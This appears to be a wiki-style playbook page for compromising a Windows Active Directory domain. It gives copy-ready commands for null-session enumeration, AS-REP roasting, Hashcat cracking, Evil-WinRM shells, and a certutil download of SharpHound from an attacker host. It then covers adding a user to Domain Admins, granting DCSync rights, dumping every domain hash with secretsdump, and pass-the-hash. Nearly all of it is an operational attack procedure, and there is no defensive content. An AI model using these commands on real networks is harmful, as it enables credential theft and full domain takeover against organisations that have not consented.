# Active-Directory-Compromise-via-AS-REP-Roasting-Hashcat-Cracking-SharpHound-and-DCSync

Multi-stage attack chain targeting Windows Active Directory environments, demonstrating reconnaissance, credential access via Kerberos AS-REP roasting, offline cracking, AD mapping with SharpHound and BloodHound, privilege escalation through ACL abuse, and final DCSync for domain credential dumping leading to full compromise.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Verified |
| Total Steps | 12 |
| Execution Time | ~2-4 hours |
| Skill Level | Intermediate-Advanced |
| Complexity | High |
| Impact Level | Critical |

## Attack Flow Visualization

```mermaid
graph TD
    A[Recon Port Scan and RPC Enum] --> B[AS-REP Roasting]
    B --> C[Hash Identification and Cracking]
    C --> D[WinRM Access]
    D --> E[SharpHound AD Mapping]
    E --> F[BloodHound Analysis]
    F --> G[Privilege Escalation via Group Add]
    G --> H[DCSync Rights Grant]
    H --> I[Credential Dumping]
    I --> J[Pass-the-Hash to Domain Admin]

    style A fill:#3498db
    style B fill:#e74c3c
    style C fill:#f39c12
    style D fill:#9b59b6
    style E fill:#1abc9c
    style F fill:#34495e
    style G fill:#e67e22
    style H fill:#c0392b
    style I fill:#e74c3c
    style J fill:#27ae60
```



## Prerequisites & Requirements

### Required Tools

- [[tools/Nmap]]
- [[tools/rpcclient]]
- [[tools/impacket-getnpusers]]
- [[tools/Hashcat]]
- [[tools/Evil-WinRM]]
- [[tools/SharpHound]]
- [[tools/BloodHound]]
- [[tools/PowerView]]
- [[tools/impacket-secretsdump]]

### Target Environment

- Windows Active Directory domain
- Accessible RPC/SMB services on ports 135, 445
- WinRM enabled on port 5985
- Kerberos on port 88
- At least one user with UF_DONT_REQUIRE_PREAUTH flag set
- Network connectivity to Domain Controller

### Initial Access Requirements

- No initial credentials for reconnaissance steps
- Valid domain username wordlist for enumeration
- Password dictionary/wordlist for Hashcat
- Credentials obtained from cracking for lateral movement

## Detailed Attack Procedures

### Step 1: Perform Initial Port Scan
procedure: [[procedures/basic-port-scan-with-service-enumeration]]

**Objective**: Identify open ports and services on the target to map the attack surface, focusing on AD-related services.

**Instructions**: Run a comprehensive Nmap scan targeting common AD ports including 88 (Kerberos), 135 (RPC), 445 (SMB), and 5985 (WinRM). Use service version detection to confirm service details.

Use [[commands/nmap-port-scan-with-service-detection]]:

```bash
nmap -sV -sC -p 88,135,445,5985 $_TARGET_IP
```

**Expected Output**: List of open ports with service versions, e.g., 445/tcp open microsoft-ds Windows Server 2019.

**Success Indicators**:
- Ports 88, 135, 445, 5985 confirmed open
- Service banners indicate Windows/AD environment

### Step 2: Enumerate Domain Users and Groups
procedure: [[procedures/enumerate-domain-users-and-groups-via-rpc-smb]]

**Objective**: Extract domain usernames and group memberships via anonymous RPC/SMB access for targeting AS-REP roasting.

**Instructions**: Connect to the target using rpcclient for null session enumeration. Query domain users and groups to build a username list.

Use [[commands/rpcclient-enumdomusers]] and [[commands/rpcclient-enumdomgroups]]:

```bash
rpcclient -U "" -N $_TARGET_IP -c "enumdomusers"
```

Follow with:

```bash
rpcclient -U "" -N $_TARGET_IP -c "enumdomgroups"
```

Save output to a users.txt file for later use.

**Expected Output**: List of usernames (e.g., 50+ users) and groups like Domain Admins.

**Success Indicators**:
- Username list extracted
- Groups including privileged ones identified

### Step 3: Perform AS-REP Roasting
procedure: [[procedures/as-rep-roast-users-without-preauth]]

**Objective**: Request AS-REP responses from users without preauth to obtain crackable TGT hashes.

**Instructions**: Use the enumerated username list to request TGS tickets via Impacket's GetNPUsers.py, targeting users with UF_DONT_REQUIRE_PREAUTH.

Use [[commands/getnpusers-as-rep-roast]]:

```bash
GetNPUsers.py $_DOMAIN/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip $_DC_IP
```

**Expected Output**: AS-REP hashes in Hashcat format, e.g., $krb5asrep$23$user@domain:hash.

**Success Indicators**:
- At least one AS-REP hash captured
- Hashes saved for cracking

### Step 4: Identify Hash Type
procedure: [[procedures/identify-hash-type-with-hashcat]]

**Objective**: Analyze captured hashes to determine the type and select the correct Hashcat mode.

**Instructions**: Use Hashcat's identification or external tools to classify the AS-REP hashes.

Use [[commands/hashcat-identify-hash]]:

```bash
hashcat --identify asrep_hashes.txt
```

**Expected Output**: Hash type identified as Kerberos 5 AS-REP etype 23, mode 18200.

**Success Indicators**:
- Hash mode confirmed as 18200

### Step 5: Crack Hashes Offline
procedure: [[procedures/crack-as-rep-hashes-with-hashcat]]

**Objective**: Brute-force or dictionary-attack the AS-REP hashes to recover plaintext passwords.

**Instructions**: Run Hashcat with the identified mode, using rockyou.txt wordlist and rules for efficiency.

Use [[commands/hashcat-crack-mode-18200]]:

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

**Expected Output**: Cracked passwords, e.g., username:password.

**Success Indicators**:
- Valid credentials recovered
- At least one password cracked

### Step 6: Gain Initial Access via WinRM
procedure: [[procedures/spawn-winrm-shell-with-credentials]]

**Objective**: Use cracked credentials to establish a remote shell on the target via WinRM.

**Instructions**: Connect to the target using evil-winrm with the obtained username and password.

Use [[commands/evil-winrm-connect-with-password]]:

```bash
evil-winrm -i $_TARGET_IP -u $_USERNAME -p $_PASSWORD
```

**Expected Output**: Interactive PowerShell prompt on the target.

**Success Indicators**:
- Shell established in user context

### Step 7: Collect AD Data with SharpHound
procedure: [[procedures/collect-ad-data-with-sharphound]]

**Objective**: Enumerate AD objects, ACLs, and relationships for path analysis.

**Instructions**: Download and execute SharpHound on the target to collect all AD data.

First, host SharpHound.exe via [[commands/python3-http-server]] on attacker:

```bash
python3 -m http.server 80
```

Download on target with [[commands/certutil-download-http]]:

```command_prompt
certutil.exe -urlcache -split -f "http://$_ATTACKER_IP/SharpHound.exe" "C:\Temp\SharpHound.exe"
```

Run [[commands/sharphound-collect-all]]:

```command_prompt
SharpHound.exe -c All --outputdirectory C:\Temp
```

Exfiltrate the ZIP file.

**Expected Output**: BloodHound-compatible ZIP with JSON data.

**Success Indicators**:
- ZIP file generated with AD objects

### Step 8: Analyze AD Paths with BloodHound
procedure: [[procedures/analyze-bloodhound-data-for-attack-paths]]

**Objective**: Import data and query for privilege escalation paths, focusing on WriteDACL and DCSync opportunities.

**Instructions**: Launch BloodHound GUI, import the ZIP, and run pre-built queries like Shortest Paths to Domain Admins.

No specific command; use GUI to identify paths involving WriteDACL on domain object.

**Expected Output**: Graph visualization showing paths to high-value targets.

**Success Indicators**:
- Exploitable permissions identified (e.g., WriteDACL)

### Step 9: Escalate via Group Membership
procedure: [[procedures/add-user-to-domain-admin-group]]

**Objective**: Add controlled user to a privileged group using existing permissions.

**Instructions**: Import PowerView, create credential if needed, and add member to Domain Admins.

Create cred with [[commands/powershell-create-pscredential]]:

```powershell
$Pass = ConvertTo-SecureString -String "$_PASSWORD" -AsPlainText -Force
$Cred = New-Object -TypeName System.Management.Automation.PSCredential -Argument "$_DOMAIN\$_USER", $Pass
```

Add with [[commands/powerview-add-group-member]]:

```powershell
Add-DomainGroupMember -Identity 'Domain Admins' -Members '$_CONTROLLED_USER' -Credential $Cred
```

**Expected Output**: User added to group.

**Success Indicators**:
- Membership verified

### Step 10: Grant DCSync Rights
procedure: [[procedures/grant-dcsync-rights-via-writedacl]]

**Objective**: Abuse WriteDACL to add DCSync ACEs for credential replication rights.

**Instructions**: Use PowerView to modify domain ACL and grant DS-Replication-Get-Changes rights.

Use [[commands/powerview-add-dcsync-acl]]:

```powershell
Add-DomainObjectAcl -TargetIdentity "DC=$_DOMAIN,DC=local" -PrincipalIdentity $_USER -Rights DCSync -Credential $Cred
```

**Expected Output**: ACE added to domain object.

**Success Indicators**:
- DCSync rights granted to user

### Step 11: Execute DCSync Dump
procedure: [[procedures/perform-dcsync-with-secretsdump]]

**Objective**: Dump all domain hashes using DCSync rights.

**Instructions**: Use Impacket secretsdump with the privileged user to perform replication dump.

Use [[commands/secretsdump-dcsync]]:

```bash
secretsdump.py $_DOMAIN/$_USER:$_PASSWORD@$_DC_IP
```

**Expected Output**: NTLM hashes for all users, including Domain Admin and krbtgt.

**Success Indicators**:
- Hashes dumped, including admin creds

### Step 12: Lateral Movement with PtH
procedure: [[procedures/access-winrm-with-pass-the-hash]]

**Objective**: Use dumped NTLM hash for Pass-the-Hash to gain Domain Admin shell.

**Instructions**: Connect via evil-winrm using the hash instead of password.

Use [[commands/evil-winrm-connect-with-ntlm]]:

```bash
evil-winrm -i $_DC_IP -u Administrator -H $_NTLM_HASH
```

**Expected Output**: Domain Admin PowerShell session.

**Success Indicators**:
- Full domain control achieved

## Attack Chain Summary

### Key Achievements

- Reconnaissance of AD services and users
- Credential recovery via AS-REP roasting and cracking
- AD mapping and path identification
- Privilege escalation to DCSync rights
- Complete domain hash dump
- Domain Admin access via PtH

---

*Last updated: 2023-06-24*
